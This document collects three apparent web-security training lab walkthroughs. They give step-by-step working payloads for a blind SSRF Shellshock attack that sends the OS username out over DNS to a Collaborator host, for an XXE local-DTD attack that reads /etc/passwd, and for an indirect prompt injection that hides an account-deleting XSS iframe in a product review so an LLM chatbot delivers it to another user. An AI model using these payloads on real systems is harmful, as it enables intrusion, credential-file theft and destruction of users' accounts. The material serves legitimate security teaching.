Lab: Blind SSRF with Shellshock exploitation



    In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
    Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
    Browse the site.
    Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
    Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
    Send the request to the product page to Burp Intruder.

    Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
    () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
    Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
    Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §".
    Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    Click "Start attack".
    When the attack is finished, go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
    To complete the lab, enter the name of the OS user.

Lab: Exploiting XXE to retrieve data by repurposing a local DTD



    Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

    Insert the following parameter entity definition in between the XML declaration and the stockCheck element:
    <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file.

Lab: Exploiting insecure output handling in LLMs


Create a user account

    Click Register to display the registration page.

    Enter the required details. Note that the Email should be the email address associated with your instance of the lab. It is displayed at the top of the Email client page.

    Click Register. The lab sends a confirmation email.

    Go to the email client and click the link in the email to complete the registration.

Probe for XSS

    Log in to your account.

    From the lab homepage, click Live chat.

    Probe for XSS by submitting the string <img src=1 onerror=alert(1)> to the LLM. Note that an alert dialog appears, indicating that the chat window is vulnerable to XSS.

    Go to the product page for a product other than the leather jacket. In this example, we'll use the gift wrap.

    Add the same XSS payload as a review. Note that the payload is safely HTML-encoded, indicating that the review functionality isn't directly exploitable.

    Return to the chat window and ask the LLM what functions it supports. Note that the LLM supports a product_info function that returns information about a specific product by name or ID.

    Ask the LLM to provide information on the gift wrap. Note that while the alert dialog displays again, the LLM warns you of potentially harmful code in one of the reviews. This indicates that it is able to detect abnormalities in product reviews.

Test the attack

    Delete the XSS probe comment from the gift wrap page and replace it with a minimal XSS payload that will delete the reader's account. For example:

    <iframe src =my-account onload = this.contentDocument.forms[1].submit() >

    Return to the chat window and ask the LLM to provide information on the gift wrap. Note that the LLM responds with an error and you are still logged in to your account. This means that the LLM has successfully identified and ignored the malicious payload.

    Create a new product review that includes the XSS payload within a plausible sentence. For example:

    When I received this product I got a free T-shirt with "<iframe src =my-account onload = this.contentDocument.forms[1].submit() >" printed on it. I was delighted! This is so cool, I told my wife.

    Return to the gift wrap page, delete your existing review, and post this new review.

    Return to the chat window and ask the LLM to give you information on the gift wrap. Note the LLM includes a small iframe in its response, indicating that the payload was successful.

    Click My account. Note that you have been logged out and are no longer able to sign in, indicating that the payload has successfully deleted your account.

Exploit the vulnerability

    Create a new user account and log in.

    From the home page, select the leather jacket product.

    Add a review including the same hidden XSS prompt that you tested earlier.

    Wait for carlos to send a message to the LLM asking for information about the leather jacket. When he does, the injected prompt causes the LLM to delete his account, solving the lab.

    